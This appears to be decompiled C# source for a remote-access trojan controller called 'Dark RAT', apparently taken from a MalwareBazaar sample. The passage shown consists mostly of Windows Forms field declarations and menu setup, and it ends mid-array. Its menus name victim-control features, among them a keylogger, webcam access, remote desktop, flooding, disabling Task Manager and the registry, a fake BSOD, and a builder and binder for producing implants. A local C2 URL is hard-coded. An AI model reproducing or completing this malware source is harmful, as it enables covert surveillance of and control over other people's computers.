// Decompiled with JetBrains decompiler
// Type: Dark_RAT.program
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class program : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("menu")]
    private ContextMenuStrip _menu;
    [AccessedThroughProperty("OpenCMDToolStripMenuItem")]
    private ToolStripMenuItem _OpenCMDToolStripMenuItem;
    [AccessedThroughProperty("checkusers")]
    private System.Windows.Forms.Timer _checkusers;
    [AccessedThroughProperty("DeleteFromListToolStripMenuItem")]
    private ToolStripMenuItem _DeleteFromListToolStripMenuItem;
    [AccessedThroughProperty("RefreshToolStripMenuItem")]
    private ToolStripMenuItem _RefreshToolStripMenuItem;
    [AccessedThroughProperty("OpenWebSiteToolStripMenuItem")]
    private ToolStripMenuItem _OpenWebSiteToolStripMenuItem;
    [AccessedThroughProperty("RegistryToolStripMenuItem")]
    private ToolStripMenuItem _RegistryToolStripMenuItem;
    [AccessedThroughProperty("BlockTaskManagerToolStripMenuItem")]
    private ToolStripMenuItem _BlockTaskManagerToolStripMenuItem;
    [AccessedThroughProperty("EnableCMDToolStripMenuItem")]
    private ToolStripMenuItem _EnableCMDToolStripMenuItem;
    [AccessedThroughProperty("EnableToolStripMenuItem3")]
    private ToolStripMenuItem _EnableToolStripMenuItem3;
    [AccessedThroughProperty("DisableToolStripMenuItem3")]
    private ToolStripMenuItem _DisableToolStripMenuItem3;
    [AccessedThroughProperty("EnableToolStripMenuItem2")]
    private ToolStripMenuItem _EnableToolStripMenuItem2;
    [AccessedThroughProperty("DisableToolStripMenuItem2")]
    private ToolStripMenuItem _DisableToolStripMenuItem2;
    [AccessedThroughProperty("DisableRegistryToolStripMenuItem")]
    private ToolStripMenuItem _DisableRegistryToolStripMenuItem;
    [AccessedThroughProperty("EnableToolStripMenuItem1")]
    private ToolStripMenuItem _EnableToolStripMenuItem1;
    [AccessedThroughProperty("DisableToolStripMenuItem1")]
    private ToolStripMenuItem _DisableToolStripMenuItem1;
    [AccessedThroughProperty("SystemRestoreToolStripMenuItem")]
    private ToolStripMenuItem _SystemRestoreToolStripMenuItem;
    [AccessedThroughProperty("EnableToolStripMenuItem")]
    private ToolStripMenuItem _EnableToolStripMenuItem;
    [AccessedThroughProperty("DisableToolStripMenuItem")]
    private ToolStripMenuItem _DisableToolStripMenuItem;
    [AccessedThroughProperty("APIToolStripMenuItem")]
    private ToolStripMenuItem _APIToolStripMenuItem;
    [AccessedThroughProperty("MonitorToolStripMenuItem")]
    private ToolStripMenuItem _MonitorToolStripMenuItem;
    [AccessedThroughProperty("TurnOnToolStripMenuItem")]
    private ToolStripMenuItem _TurnOnToolStripMenuItem;
    [AccessedThroughProperty("TurnOffToolStripMenuItem")]
    private ToolStripMenuItem _TurnOffToolStripMenuItem;
    [AccessedThroughProperty("KeyboardMouseToolStripMenuItem")]
    private ToolStripMenuItem _KeyboardMouseToolStripMenuItem;
    [AccessedThroughProperty("BlockToolStripMenuItem")]
    private ToolStripMenuItem _BlockToolStripMenuItem;
    [AccessedThroughProperty("UnblockToolStripMenuItem")]
    private ToolStripMenuItem _UnblockToolStripMenuItem;
    [AccessedThroughProperty("PCToolStripMenuItem")]
    private ToolStripMenuItem _PCToolStripMenuItem;
    [AccessedThroughProperty("StatusToolStripMenuItem")]
    private ToolStripMenuItem _StatusToolStripMenuItem;
    [AccessedThroughProperty("ShutdownToolStripMenuItem")]
    private ToolStripMenuItem _ShutdownToolStripMenuItem;
    [AccessedThroughProperty("RestartToolStripMenuItem")]
    private ToolStripMenuItem _RestartToolStripMenuItem;
    [AccessedThroughProperty("StandByToolStripMenuItem")]
    private ToolStripMenuItem _StandByToolStripMenuItem;
    [AccessedThroughProperty("HibernationToolStripMenuItem")]
    private ToolStripMenuItem _HibernationToolStripMenuItem;
    [AccessedThroughProperty("CDRomToolStripMenuItem")]
    private ToolStripMenuItem _CDRomToolStripMenuItem;
    [AccessedThroughProperty("OpenToolStripMenuItem")]
    private ToolStripMenuItem _OpenToolStripMenuItem;
    [AccessedThroughProperty("CloseToolStripMenuItem")]
    private ToolStripMenuItem _CloseToolStripMenuItem;
    [AccessedThroughProperty("Mouse00ToolStripMenuItem")]
    private ToolStripMenuItem _Mouse00ToolStripMenuItem;
    [AccessedThroughProperty("BlockSiteToolStripMenuItem")]
    private ToolStripMenuItem _BlockSiteToolStripMenuItem;
    [AccessedThroughProperty("CloseProcessToolStripMenuItem")]
    private ToolStripMenuItem _CloseProcessToolStripMenuItem;
    [AccessedThroughProperty("DeleteFileToolStripMenuItem")]
    private ToolStripMenuItem _DeleteFileToolStripMenuItem;
    [AccessedThroughProperty("SetIEHomePageToolStripMenuItem")]
    private ToolStripMenuItem _SetIEHomePageToolStripMenuItem;
    [AccessedThroughProperty("SetClipboardToolStripMenuItem")]
    private ToolStripMenuItem _SetClipboardToolStripMenuItem;
    [AccessedThroughProperty("DwarOnScreenToolStripMenuItem")]
    private ToolStripMenuItem _DwarOnScreenToolStripMenuItem;
    [AccessedThroughProperty("DesktopToolStripMenuItem")]
    private ToolStripMenuItem _DesktopToolStripMenuItem;
    [AccessedThroughProperty("LockToolStripMenuItem")]
    private ToolStripMenuItem _LockToolStripMenuItem;
    [AccessedThroughProperty("UnlockToolStripMenuItem")]
    private ToolStripMenuItem _UnlockToolStripMenuItem;
    [AccessedThroughProperty("ClockToolStripMenuItem")]
    private ToolStripMenuItem _ClockToolStripMenuItem;
    [AccessedThroughProperty("ShowToolStripMenuItem")]
    private ToolStripMenuItem _ShowToolStripMenuItem;
    [AccessedThroughProperty("HideToolStripMenuItem")]
    private ToolStripMenuItem _HideToolStripMenuItem;
    [AccessedThroughProperty("NotifyToolStripMenuItem")]
    private ToolStripMenuItem _NotifyToolStripMenuItem;
    [AccessedThroughProperty("ShowToolStripMenuItem1")]
    private ToolStripMenuItem _ShowToolStripMenuItem1;
    [AccessedThroughProperty("HideToolStripMenuItem1")]
    private ToolStripMenuItem _HideToolStripMenuItem1;
    [AccessedThroughProperty("CleanRecycleBinToolStripMenuItem")]
    private ToolStripMenuItem _CleanRecycleBinToolStripMenuItem;
    [AccessedThroughProperty("CloseToolStripMenuItem1")]
    private ToolStripMenuItem _CloseToolStripMenuItem1;
    [AccessedThroughProperty("menubar")]
    private MenuStrip _menubar;
    [AccessedThroughProperty("MenuToolStripMenuItem")]
    private ToolStripMenuItem _MenuToolStripMenuItem;
    [AccessedThroughProperty("ExitToolStripMenuItem")]
    private ToolStripMenuItem _ExitToolStripMenuItem;
    [AccessedThroughProperty("FocusToolStripMenuItem")]
    private ToolStripMenuItem _FocusToolStripMenuItem;
    [AccessedThroughProperty("SoundToolStripMenuItem")]
    private ToolStripMenuItem _SoundToolStripMenuItem;
    [AccessedThroughProperty("MuteToolStripMenuItem")]
    private ToolStripMenuItem _MuteToolStripMenuItem;
    [AccessedThroughProperty("ProcessSusResToolStripMenuItem")]
    private ToolStripMenuItem _ProcessSusResToolStripMenuItem;
    [AccessedThroughProperty("TaskbarToolStripMenuItem")]
    private ToolStripMenuItem _TaskbarToolStripMenuItem;
    [AccessedThroughProperty("ShowToolStripMenuItem2")]
    private ToolStripMenuItem _ShowToolStripMenuItem2;
    [AccessedThroughProperty("HideToolStripMenuItem2")]
    private ToolStripMenuItem _HideToolStripMenuItem2;
    [AccessedThroughProperty("IconsToolStripMenuItem")]
    private ToolStripMenuItem _IconsToolStripMenuItem;
    [AccessedThroughProperty("ShowToolStripMenuItem3")]
    private ToolStripMenuItem _ShowToolStripMenuItem3;
    [AccessedThroughProperty("HideToolStripMenuItem3")]
    private ToolStripMenuItem _HideToolStripMenuItem3;
    [AccessedThroughProperty("ChangeProcessTitleToolStripMenuItem")]
    private ToolStripMenuItem _ChangeProcessTitleToolStripMenuItem;
    [AccessedThroughProperty("USBWriteToolStripMenuItem")]
    private ToolStripMenuItem _USBWriteToolStripMenuItem;
    [AccessedThroughProperty("BlockToolStripMenuItem1")]
    private ToolStripMenuItem _BlockToolStripMenuItem1;
    [AccessedThroughProperty("UnblockToolStripMenuItem1")]
    private ToolStripMenuItem _UnblockToolStripMenuItem1;
    [AccessedThroughProperty("BuilderToolStripMenuItem")]
    private ToolStripMenuItem _BuilderToolStripMenuItem;
    [AccessedThroughProperty("SettingsToolStripMenuItem")]
    private ToolStripMenuItem _SettingsToolStripMenuItem;
    [AccessedThroughProperty("SetTimeToolStripMenuItem")]
    private ToolStripMenuItem _SetTimeToolStripMenuItem;
    [AccessedThroughProperty("InfoToolStripMenuItem")]
    private ToolStripMenuItem _InfoToolStripMenuItem;
    [AccessedThroughProperty("FunnyToolStripMenuItem")]
    private ToolStripMenuItem _FunnyToolStripMenuItem;
    [AccessedThroughProperty("FakeBSODToolStripMenuItem")]
    private ToolStripMenuItem _FakeBSODToolStripMenuItem;
    [AccessedThroughProperty("ShowToolStripMenuItem4")]
    private ToolStripMenuItem _ShowToolStripMenuItem4;
    [AccessedThroughProperty("HideToolStripMenuItem4")]
    private ToolStripMenuItem _HideToolStripMenuItem4;
    [AccessedThroughProperty("PrintToolStripMenuItem")]
    private ToolStripMenuItem _PrintToolStripMenuItem;
    [AccessedThroughProperty("SwapMouseToolStripMenuItem")]
    private ToolStripMenuItem _SwapMouseToolStripMenuItem;
    [AccessedThroughProperty("LeftToolStripMenuItem")]
    private ToolStripMenuItem _LeftToolStripMenuItem;
    [AccessedThroughProperty("RightToolStripMenuItem")]
    private ToolStripMenuItem _RightToolStripMenuItem;
    [AccessedThroughProperty("ClipboardToolStripMenuItem")]
    private ToolStripMenuItem _ClipboardToolStripMenuItem;
    [AccessedThroughProperty("LockToolStripMenuItem1")]
    private ToolStripMenuItem _LockToolStripMenuItem1;
    [AccessedThroughProperty("InlockToolStripMenuItem")]
    private ToolStripMenuItem _InlockToolStripMenuItem;
    [AccessedThroughProperty("CapsLockToolStripMenuItem")]
    private ToolStripMenuItem _CapsLockToolStripMenuItem;
    [AccessedThroughProperty("OnToolStripMenuItem")]
    private ToolStripMenuItem _OnToolStripMenuItem;
    [AccessedThroughProperty("TurnOffToolStripMenuItem1")]
    private ToolStripMenuItem _TurnOffToolStripMenuItem1;
    [AccessedThroughProperty("FakeMessageToolStripMenuItem")]
    private ToolStripMenuItem _FakeMessageToolStripMenuItem;
    [AccessedThroughProperty("HidenFilesToolStripMenuItem")]
    private ToolStripMenuItem _HidenFilesToolStripMenuItem;
    [AccessedThroughProperty("EnabledToolStripMenuItem")]
    private ToolStripMenuItem _EnabledToolStripMenuItem;
    [AccessedThroughProperty("DisabledToolStripMenuItem")]
    private ToolStripMenuItem _DisabledToolStripMenuItem;
    [AccessedThroughProperty("icon")]
    private NotifyIcon _icon;
    [AccessedThroughProperty("RemoteToolStripMenuItem")]
    private ToolStripMenuItem _RemoteToolStripMenuItem;
    [AccessedThroughProperty("DesktopToolStripMenuItem1")]
    private ToolStripMenuItem _DesktopToolStripMenuItem1;
    [AccessedThroughProperty("ProcessManagerToolStripMenuItem")]
    private ToolStripMenuItem _ProcessManagerToolStripMenuItem;
    [AccessedThroughProperty("ListView1")]
    private ListView _ListView1;
    [AccessedThroughProperty("ColumnHeader1")]
    private ColumnHeader _ColumnHeader1;
    [AccessedThroughProperty("ColumnHeader2")]
    private ColumnHeader _ColumnHeader2;
    [AccessedThroughProperty("ColumnHeader3")]
    private ColumnHeader _ColumnHeader3;
    [AccessedThroughProperty("ColumnHeader4")]
    private ColumnHeader _ColumnHeader4;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("notify")]
    private StatusStrip _notify;
    [AccessedThroughProperty("ToolStripStatusLabel1")]
    private ToolStripStatusLabel _ToolStripStatusLabel1;
    [AccessedThroughProperty("ToolStripStatusLabel3")]
    private ToolStripStatusLabel _ToolStripStatusLabel3;
    [AccessedThroughProperty("ToolStripStatusLabel2")]
    private ToolStripStatusLabel _ToolStripStatusLabel2;
    [AccessedThroughProperty("KeyloggerToolStripMenuItem")]
    private ToolStripMenuItem _KeyloggerToolStripMenuItem;
    [AccessedThroughProperty("FlipScreenToolStripMenuItem")]
    private ToolStripMenuItem _FlipScreenToolStripMenuItem;
    [AccessedThroughProperty("TurnOnToolStripMenuItem1")]
    private ToolStripMenuItem _TurnOnToolStripMenuItem1;
    [AccessedThroughProperty("TurnOffToolStripMenuItem2")]
    private ToolStripMenuItem _TurnOffToolStripMenuItem2;
    [AccessedThroughProperty("ColumnHeader5")]
    private ColumnHeader _ColumnHeader5;
    [AccessedThroughProperty("ColumnHeader6")]
    private ColumnHeader _ColumnHeader6;
    [AccessedThroughProperty("Label5")]
    private Label _Label5;
    [AccessedThroughProperty("Label6")]
    private Label _Label6;
    [AccessedThroughProperty("countryflag")]
    private ImageList _countryflag;
    [AccessedThroughProperty("GetFlagToolStripMenuItem")]
    private ToolStripMenuItem _GetFlagToolStripMenuItem;
    [AccessedThroughProperty("OtherToolStripMenuItem")]
    private ToolStripMenuItem _OtherToolStripMenuItem;
    [AccessedThroughProperty("FloodToolStripMenuItem")]
    private ToolStripMenuItem _FloodToolStripMenuItem;
    [AccessedThroughProperty("HideShowToolStripMenuItem")]
    private ToolStripMenuItem _HideShowToolStripMenuItem;
    [AccessedThroughProperty("CountryToolStripMenuItem")]
    private ToolStripMenuItem _CountryToolStripMenuItem;
    [AccessedThroughProperty("OSToolStripMenuItem")]
    private ToolStripMenuItem _OSToolStripMenuItem;
    [AccessedThroughProperty("IPToolStripMenuItem")]
    private ToolStripMenuItem _IPToolStripMenuItem;
    [AccessedThroughProperty("CountryToolStripMenuItem1")]
    private ToolStripMenuItem _CountryToolStripMenuItem1;
    [AccessedThroughProperty("CPUToolStripMenuItem")]
    private ToolStripMenuItem _CPUToolStripMenuItem;
    [AccessedThroughProperty("RAMToolStripMenuItem")]
    private ToolStripMenuItem _RAMToolStripMenuItem;
    [AccessedThroughProperty("AboutToolStripMenuItem")]
    private ToolStripMenuItem _AboutToolStripMenuItem;
    [AccessedThroughProperty("ChatToolStripMenuItem")]
    private ToolStripMenuItem _ChatToolStripMenuItem;
    [AccessedThroughProperty("WebcamToolStripMenuItem")]
    private ToolStripMenuItem _WebcamToolStripMenuItem;
    [AccessedThroughProperty("ScreenSaverToolStripMenuItem")]
    private ToolStripMenuItem _ScreenSaverToolStripMenuItem;
    [AccessedThroughProperty("TurnOnToolStripMenuItem2")]
    private ToolStripMenuItem _TurnOnToolStripMenuItem2;
    [AccessedThroughProperty("TurnOffToolStripMenuItem3")]
    private ToolStripMenuItem _TurnOffToolStripMenuItem3;
    [AccessedThroughProperty("ToolStripMenuItem1")]
    private ToolStripMenuItem _ToolStripMenuItem1;
    [AccessedThroughProperty("InstalledSoftwareToolStripMenuItem")]
    private ToolStripMenuItem _InstalledSoftwareToolStripMenuItem;
    [AccessedThroughProperty("ClickerToolStripMenuItem")]
    private ToolStripMenuItem _ClickerToolStripMenuItem;
    [AccessedThroughProperty("ToolStripMenuItem2")]
    private ToolStripMenuItem _ToolStripMenuItem2;
    [AccessedThroughProperty("IEClearToolStripMenuItem")]
    private ToolStripMenuItem _IEClearToolStripMenuItem;
    [AccessedThroughProperty("CookiesToolStripMenuItem")]
    private ToolStripMenuItem _CookiesToolStripMenuItem;
    [AccessedThroughProperty("HistoryToolStripMenuItem")]
    private ToolStripMenuItem _HistoryToolStripMenuItem;
    [AccessedThroughProperty("FormDataToolStripMenuItem")]
    private ToolStripMenuItem _FormDataToolStripMenuItem;
    [AccessedThroughProperty("TempFilesToolStripMenuItem")]
    private ToolStripMenuItem _TempFilesToolStripMenuItem;
    [AccessedThroughProperty("ResponseToolStripMenuItem")]
    private ToolStripMenuItem _ResponseToolStripMenuItem;
    [AccessedThroughProperty("ToolStripMenuItem3")]
    private ToolStripMenuItem _ToolStripMenuItem3;
    [AccessedThroughProperty("RenameFileToolStripMenuItem")]
    private ToolStripMenuItem _RenameFileToolStripMenuItem;
    [AccessedThroughProperty("ToolStripMenuItem4")]
    private ToolStripMenuItem _ToolStripMenuItem4;
    [AccessedThroughProperty("ToolStripMenuItem5")]
    private ToolStripMenuItem _ToolStripMenuItem5;
    [AccessedThroughProperty("UpdateToolStripMenuItem")]
    private ToolStripMenuItem _UpdateToolStripMenuItem;
    [AccessedThroughProperty("ExtraToolStripMenuItem")]
    private ToolStripMenuItem _ExtraToolStripMenuItem;
    [AccessedThroughProperty("BinderToolStripMenuItem")]
    private ToolStripMenuItem _BinderToolStripMenuItem;
    private string fvgrSc7fMzt32at3;
    private int pbhaguDAhV2jtD75g4gn3D4;
    private object connected;
    private WebClient fraqCe58F9PvfV2pSval61pAl2gYnx6UwZCC4Q4zFOjWqan2c6d4Q;
    public object sPath;

    [DebuggerNonUserCode]
    static program()
    {
    }

    public program()
    {
      this.Load += new EventHandler(this.Form1_Load);
      program.__ENCAddToList((object) this);
      this.fvgrSc7fMzt32at3 = "http://127.0.0.1/rat//rat/";
      this.pbhaguDAhV2jtD75g4gn3D4 = Conversions.ToInteger("0");
      this.connected = (object) "0";
      this.fraqCe58F9PvfV2pSval61pAl2gYnx6UwZCC4Q4zFOjWqan2c6d4Q = new WebClient();
      this.sPath = (object) (Application.StartupPath + "/Settings.ini");
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (program.__ENCList)
      {
        if (program.__ENCList.Count == program.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (program.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (program.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                program.__ENCList[index1] = program.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          program.__ENCList.RemoveRange(index1, checked (program.__ENCList.Count - index1));
          program.__ENCList.Capacity = program.__ENCList.Count;
        }
        program.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (program));
      this.menu = new ContextMenuStrip(this.components);
      this.PCToolStripMenuItem = new ToolStripMenuItem();
      this.StatusToolStripMenuItem = new ToolStripMenuItem();
      this.ShutdownToolStripMenuItem = new ToolStripMenuItem();
      this.RestartToolStripMenuItem = new ToolStripMenuItem();
      this.StandByToolStripMenuItem = new ToolStripMenuItem();
      this.HibernationToolStripMenuItem = new ToolStripMenuItem();
      this.CDRomToolStripMenuItem = new ToolStripMenuItem();
      this.OpenToolStripMenuItem = new ToolStripMenuItem();
      this.CloseToolStripMenuItem = new ToolStripMenuItem();
      this.Mouse00ToolStripMenuItem = new ToolStripMenuItem();
      this.BlockSiteToolStripMenuItem = new ToolStripMenuItem();
      this.CloseProcessToolStripMenuItem = new ToolStripMenuItem();
      this.DeleteFileToolStripMenuItem = new ToolStripMenuItem();
      this.SetIEHomePageToolStripMenuItem = new ToolStripMenuItem();
      this.SetClipboardToolStripMenuItem = new ToolStripMenuItem();
      this.DwarOnScreenToolStripMenuItem = new ToolStripMenuItem();
      this.CleanRecycleBinToolStripMenuItem = new ToolStripMenuItem();
      this.USBWriteToolStripMenuItem = new ToolStripMenuItem();
      this.BlockToolStripMenuItem1 = new ToolStripMenuItem();
      this.UnblockToolStripMenuItem1 = new ToolStripMenuItem();
      this.SetTimeToolStripMenuItem = new ToolStripMenuItem();
      this.InfoToolStripMenuItem = new ToolStripMenuItem();
      this.ToolStripMenuItem1 = new ToolStripMenuItem();
      this.InstalledSoftwareToolStripMenuItem = new ToolStripMenuItem();
      this.IEClearToolStripMenuItem = new ToolStripMenuItem();
      this.CookiesToolStripMenuItem = new ToolStripMenuItem();
      this.HistoryToolStripMenuItem = new ToolStripMenuItem();
      this.FormDataToolStripMenuItem = new ToolStripMenuItem();
      this.TempFilesToolStripMenuItem = new ToolStripMenuItem();
      this.APIToolStripMenuItem = new ToolStripMenuItem();
      this.MonitorToolStripMenuItem = new ToolStripMenuItem();
      this.TurnOnToolStripMenuItem = new ToolStripMenuItem();
      this.TurnOffToolStripMenuItem = new ToolStripMenuItem();
      this.FlipScreenToolStripMenuItem = new ToolStripMenuItem();
      this.TurnOnToolStripMenuItem1 = new ToolStripMenuItem();
      this.TurnOffToolStripMenuItem2 = new ToolStripMenuItem();
      this.ScreenSaverToolStripMenuItem = new ToolStripMenuItem();
      this.TurnOnToolStripMenuItem2 = new ToolStripMenuItem();
      this.TurnOffToolStripMenuItem3 = new ToolStripMenuItem();
      this.KeyboardMouseToolStripMenuItem = new ToolStripMenuItem();
      this.SwapMouseToolStripMenuItem = new ToolStripMenuItem();
      this.LeftToolStripMenuItem = new ToolStripMenuItem();
      this.RightToolStripMenuItem = new ToolStripMenuItem();
      this.BlockToolStripMenuItem = new ToolStripMenuItem();
      this.UnblockToolStripMenuItem = new ToolStripMenuItem();
      this.ClickerToolStripMenuItem = new ToolStripMenuItem();
      this.DesktopToolStripMenuItem = new ToolStripMenuItem();
      this.LockToolStripMenuItem = new ToolStripMenuItem();
      this.UnlockToolStripMenuItem = new ToolStripMenuItem();
      this.FocusToolStripMenuItem = new ToolStripMenuItem();
      this.ClockToolStripMenuItem = new ToolStripMenuItem();
      this.ShowToolStripMenuItem = new ToolStripMenuItem();
      this.HideToolStripMenuItem = new ToolStripMenuItem();
      this.NotifyToolStripMenuItem = new ToolStripMenuItem();
      this.ShowToolStripMenuItem1 = new ToolStripMenuItem();
      this.HideToolStripMenuItem1 = new ToolStripMenuItem();
      this.SoundToolStripMenuItem = new ToolStripMenuItem();
      this.MuteToolStripMenuItem = new ToolStripMenuItem();
      this.ProcessSusResToolStripMenuItem = new ToolStripMenuItem();
      this.TaskbarToolStripMenuItem = new ToolStripMenuItem();
      this.ShowToolStripMenuItem2 = new ToolStripMenuItem();
      this.HideToolStripMenuItem2 = new ToolStripMenuItem();
      this.IconsToolStripMenuItem = new ToolStripMenuItem();
      this.ShowToolStripMenuItem3 = new ToolStripMenuItem();
      this.HideToolStripMenuItem3 = new ToolStripMenuItem();
      this.ChangeProcessTitleToolStripMenuItem = new ToolStripMenuItem();
      this.ClipboardToolStripMenuItem = new ToolStripMenuItem();
      this.LockToolStripMenuItem1 = new ToolStripMenuItem();
      this.InlockToolStripMenuItem = new ToolStripMenuItem();
      this.HidenFilesToolStripMenuItem = new ToolStripMenuItem();
      this.EnabledToolStripMenuItem = new ToolStripMenuItem();
      this.DisabledToolStripMenuItem = new ToolStripMenuItem();
      this.ToolStripMenuItem2 = new ToolStripMenuItem();
      this.ToolStripMenuItem5 = new ToolStripMenuItem();
      this.RegistryToolStripMenuItem = new ToolStripMenuItem();
      this.BlockTaskManagerToolStripMenuItem = new ToolStripMenuItem();
      this.EnableToolStripMenuItem3 = new ToolStripMenuItem();
      this.DisableToolStripMenuItem3 = new ToolStripMenuItem();
      this.EnableCMDToolStripMenuItem = new ToolStripMenuItem();
      this.EnableToolStripMenuItem2 = new ToolStripMenuItem();
      this.DisableToolStripMenuItem2 = new ToolStripMenuItem();
      this.DisableRegistryToolStripMenuItem = new ToolStripMenuItem();
      this.EnableToolStripMenuItem1 = new ToolStripMenuItem();
      this.DisableToolStripMenuItem1 = new ToolStripMenuItem();
      this.SystemRestoreToolStripMenuItem = new ToolStripMenuItem();
      this.EnableToolStripMenuItem = new ToolStripMenuItem();
      this.DisableToolStripMenuItem = new ToolStripMenuItem();
      this.FunnyToolStripMenuItem = new ToolStripMenuItem();
      this.PrintToolStripMenuItem = new ToolStripMenuItem();
      this.FakeBSODToolStripMenuItem = new ToolStripMenuItem();
      this.ShowToolStripMenuItem4 = new ToolStripMenuItem();
      this.HideToolStripMenuItem4 = new ToolStripMenuItem();
      this.CapsLockToolStripMenuItem = new ToolStripMenuItem();
      this.OnToolStripMenuItem = new ToolStripMenuItem();
      this.TurnOffToolStripMenuItem1 = new ToolStripMenuItem();
      this.FakeMessageToolStripMenuItem = new ToolStripMenuItem();
      this.RemoteToolStripMenuItem = new ToolStripMenuItem();
      this.DesktopToolStripMenuItem1 = new ToolStripMenuItem();
      this.ProcessManagerToolStripMenuItem = new ToolStripMenuItem();
      this.KeyloggerToolStripMenuItem = new ToolStripMenuItem();
      this.ChatToolStripMenuItem = new ToolStripMenuItem();
      this.WebcamToolStripMenuItem = new ToolStripMenuItem();
      this.ToolStripMenuItem3 = new ToolStripMenuItem();
      this.OtherToolStripMenuItem = new ToolStripMenuItem();
      this.FloodToolStripMenuItem = new ToolStripMenuItem();
      this.RenameFileToolStripMenuItem = new ToolStripMenuItem();
      this.ToolStripMenuItem4 = new ToolStripMenuItem();
      this.OpenCMDToolStripMenuItem = new ToolStripMenuItem();
      this.OpenWebSiteToolStripMenuItem = new ToolStripMenuItem();
      this.GetFlagToolStripMenuItem = new ToolStripMenuItem();
      this.ResponseToolStripMenuItem = new ToolStripMenuItem();
      this.DeleteFromListToolStripMenuItem = new ToolStripMenuItem();
      this.CloseToolStripMenuItem1 = new ToolStripMenuItem();
      this.RefreshToolStripMenuItem = new ToolStripMenuItem();
      this.HideShowToolStripMenuItem = new ToolStripMenuItem();
      this.CountryToolStripMenuItem = new ToolStripMenuItem();
      this.OSToolStripMenuItem = new ToolStripMenuItem();
      this.IPToolStripMenuItem = new ToolStripMenuItem();
      this.CountryToolStripMenuItem1 = new ToolStripMenuItem();
      this.CPUToolStripMenuItem = new ToolStripMenuItem();
      this.RAMToolStripMenuItem = new ToolStripMenuItem();
      this.checkusers = new System.Windows.Forms.Timer(this.components);
      this.menubar = new MenuStrip();
      this.MenuToolStripMenuItem = new ToolStripMenuItem();
      this.BuilderToolStripMenuItem = new ToolStripMenuItem();
      this.ExtraToolStripMenuItem = new ToolStripMenuItem();
      this.BinderToolStripMenuItem = new ToolStripMenuItem();
      this.SettingsToolStripMenuItem = new ToolStripMenuItem();
      this.ExitToolStripMenuItem = new ToolStripMenuItem();
      this.UpdateToolStripMenuItem = new ToolStripMenuItem();
      this.AboutToolStripMenuItem = new ToolStripMenuItem();
      this.icon = new NotifyIcon(this.components);
      this.notify = new StatusStrip();
      this.ToolStripStatusLabel1 = new ToolStripStatusLabel();
      this.ToolStripStatusLabel3 = new ToolStripStatusLabel();
      this.ToolStripStatusLabel2 = new ToolStripStatusLabel();
      this.Label4 = new Label();
      this.Label3 = new Label();
      this.Label2 = new Label();
      this.TextBox1 = new TextBox();
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.Label1 = new Label();
      this.ListView1 = new ListView();
      this.ColumnHeader1 = new ColumnHeader();
      this.ColumnHeader2 = new ColumnHeader();
      this.ColumnHeader3 = new ColumnHeader();
      this.ColumnHeader4 = new ColumnHeader();
      this.ColumnHeader5 = new ColumnHeader();
      this.ColumnHeader6 = new ColumnHeader();
      this.countryflag = new ImageList(this.components);
      this.Label5 = new Label();
      this.Label6 = new Label();
      this.menu.SuspendLayout();
      this.menubar.SuspendLayout();
      this.notify.SuspendLayout();
      this.SuspendLayout();
      this.menu.Items.AddRange(new ToolStripItem[14]
      {
        (ToolStripItem) this.PCToolStripMenuItem,
        (ToolStripItem) this.APIToolStripMenuItem,
        (ToolStripItem) this.RegistryToolStripMenuItem,
        (ToolStripItem) this.FunnyToolStripMenuItem,
        (ToolStripItem) this.RemoteToolStripMenuItem,
        (ToolStripItem) this.OtherToolStripMenuItem,
        (ToolStripItem) this.OpenCMDToolStripMenuItem,
        (ToolStripItem) this.OpenWebSiteToolStripMenuItem,
        (ToolStripItem) this.GetFlagToolStripMenuItem,
        (ToolStripItem) this.ResponseToolStripMenuItem,
        (ToolStripItem) this.DeleteFromListToolStripMenuItem,
        (ToolStripItem) this.CloseToolStripMenuItem1,
        (ToolStripItem) this.RefreshToolStripMenuItem,
        (ToolStripItem) this.HideShowToolStripMenuItem
      });
      this.menu.Name = "ContextMenuStrip1";
      ContextMenuStrip menu = this.menu;
      Size size1 = new Size(160, 312);
      Size size2 = size1;
      menu.Size = size2;
      this.PCToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[16]
      {
        (ToolStripItem) this.StatusToolStripMenuItem,
        (ToolStripItem) this.CDRomToolStripMenuItem,
        (ToolStripItem) this.Mouse00ToolStripMenuItem,
        (ToolStripItem) this.BlockSiteToolStripMenuItem,
        (ToolStripItem) this.CloseProcessToolStripMenuItem,
        (ToolStripItem) this.DeleteFileToolStripMenuItem,
        (ToolStripItem) this.SetIEHomePageToolStripMenuItem,
        (ToolStripItem) this.SetClipboardToolStripMenuItem,
